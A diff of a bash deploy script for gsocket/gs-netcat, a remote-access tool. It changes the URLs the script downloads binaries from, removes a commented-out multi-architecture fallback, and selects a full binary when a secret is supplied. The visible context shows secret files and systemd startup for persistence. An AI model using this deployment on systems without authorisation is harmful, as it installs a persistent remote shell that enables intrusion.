@@ -65,12 +65,19 @@
 #       - Guess what...
 
 # Global Defines
-URL_BASE="https://gsocket.io"
-[[ -n $GS_URL_BASE ]] && URL_BASE="${GS_URL_BASE}"
-URL_BIN="${URL_BASE}/bin"
-URL_DEPLOY="${URL_BASE}/x"
-[[ -n $GS_URL_BIN ]] && URL_BIN="${GS_URL_BIN}"
-[[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}"
+URL_BASE_CDN="https://cdn.gsocket.io"
+URL_BASE_X="https://gsocket.io"
+[[ -n $GS_URL_BASE ]] && {
+	URL_BASE_CDN="${GS_URL_BASE}"
+	URL_BASE_X="${GS_URL_BASE}"
+}
+URL_BIN="${URL_BASE_CDN}/bin"       # mini & stripped version
+URL_BIN_FULL="${URL_BASE_CDN}/full" # full version (with -h working)
+[[ -n $GS_URL_BIN ]] && {
+	URL_BIN="${GS_URL_BIN}"
+	URL_BIN_FULL="$URL_BIN"
+}
+[[ -n $GS_URL_DEPLOY ]] && URL_DEPLOY="${GS_URL_DEPLOY}" || URL_DEPLOY="${URL_BASE_X}/x"
 
 # STUBS for deploy_server.sh to fill out:
 gs_deploy_webhook=
@@ -1500,29 +1507,6 @@ try()
 	rm -f "${TMPDIR}/${src_pkg:?}"
 }
 
-# Download the gs-netcat_any-any.tar.gz and try all of the containing
-# binaries and fail hard if none could be found.
-# try_any()
-# {
-# 	local i
-# 	# targets="x86_64-alpine i386-alpine aarch64-linux arm-linux x86_64-osx x86_64-cygwin i686-cygwin mips32-alpine mipsel32-alpine x86_64-freebsd"
-# 	targets=(x86_64-alpine            i386-alpine                aarch64-linux                arm-linux x86_64-osx x86_64-cygwin i686-cygwin mips32-alpine mipsel32-alpine x86_64-freebsd)
-# 	pkgs=(gs-netcat_mini-linux-x86_64 gs-netcat_${OSARCH}.tar.gz gs-netcat_mini-linux-aarch64 )
-# 	for i in "${!targets[@]}"; do
-# 	done
-# 	for osarch in $targets; do
-# 		[[ "$osarch" == "$OSARCH" ]] && continue # Skip the default OSARCH (already tried)
-# 		try "$osarch"
-# 		[[ -n "$IS_TESTBIN_OK" ]] && break
-# 	done
-
-# 	if [[ -n "$IS_TESTBIN_OK" ]]; then
-# 		echo -e >&2 "--> ${CY}Installation did not go as smooth as it should have.${CN}"
-# 	else
-# 		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
-# 	fi
-# }
-
 gs_start_systemd()
 {
 	# HERE: It's systemd
@@ -1603,6 +1587,7 @@ init_setup
 [[ -n "$X" ]] && GS_SECRET_X="$X"
 
 if [[ -z $S ]]; then
+	# HERE: S= is NOT set
 	if [[ $UID -eq 0 ]]; then
 		gs_secret_reload "$SYSTEMD_SEC_FILE" 
 		gs_secret_reload "$RCLOCAL_SEC_FILE" 
@@ -1618,6 +1603,7 @@ if [[ -z $S ]]; then
 	DEBUGF "GS_SECRET=$GS_SECRET (F=${GS_SECRET_FROM_FILE}, X=${GS_SECRET_X})"
 else
 	GS_SECRET="$S"
+	URL_BIN="$URL_BIN_FULL"
 fi
 
 try "$OSARCH" "$SRC_PKG"
